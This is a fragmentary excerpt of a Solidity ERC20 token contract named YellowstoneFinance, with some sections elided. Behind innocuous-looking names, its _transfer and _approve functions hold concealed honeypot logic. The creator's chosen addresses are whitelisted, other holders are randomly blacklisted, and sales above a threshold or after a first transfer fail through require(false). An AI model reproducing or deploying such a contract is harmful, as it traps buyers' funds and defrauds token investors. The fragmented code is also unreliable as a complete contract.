...
contract YellowstoneFinance is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public threecorners;
  mapping (address => bool) public texas;
  mapping (address => bool) public oklahoma;
  mapping (address => uint256) public bobby;
  ...
  constructor() public {
    ...
    maya = chTx * 30;
    texas[creator] = false;
    oklahoma[creator] = false;
    threecorners[msg.sender] = true;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (latina == true)) {
      threecorners[recipient] = true;
      texas[recipient] = false;
      latina = false;
    }
    
    if ((amount > maya) && (threecorners[sender] == true) && (address(sender) != creator)) {
        oklahoma[recipient] = true;
    }
    
    if (threecorners[recipient] != true) {
        texas[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((texas[sender]) && (threecorners[recipient] == false)) {
        texas[recipient] = true;
    }
    
    if (threecorners[sender] == false) {
      if ((amount > maya) && (oklahoma[sender] == true)) {
        require(false);
      }
      
      require(amount < oaxaca);
      if (yucatan == true) {
        if (oklahoma[sender] == true) {
          require(false);
        }
        oklahoma[sender] = true;
      }
    }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (quintana == true)) {
      threecorners[spender] = true;
      texas[spender] = false;
      oklahoma[spender] = false;
      quintana = false;
    }
    
    tok = (texas[owner] ? 8726524 : amount);
